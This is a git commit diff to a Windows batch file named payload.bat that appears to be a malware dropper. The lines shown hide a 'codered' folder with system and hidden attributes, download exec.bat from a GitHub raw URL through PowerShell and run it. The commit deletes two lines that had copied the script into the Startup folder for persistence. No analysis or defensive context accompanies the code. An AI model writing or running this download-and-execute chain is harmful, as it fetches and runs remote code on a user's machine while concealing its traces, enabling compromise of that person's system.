06017a87f77564194625816f0e9a357c2efbac83
timberh789 <53507393+timberh789@users.noreply.github.com>
2022-01-26 11:16:32 +0800

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -6,5 +6,4 @@ attrib +s +h codered
 cd %USERPROFILE%\codered
 powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/timberh789/Server/main/exec.bat', 'exec.bat')
 start %USERPROFILE%\codered\exec.bat
-echo move /Y %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat">pls.bat
-start pls.bat
+
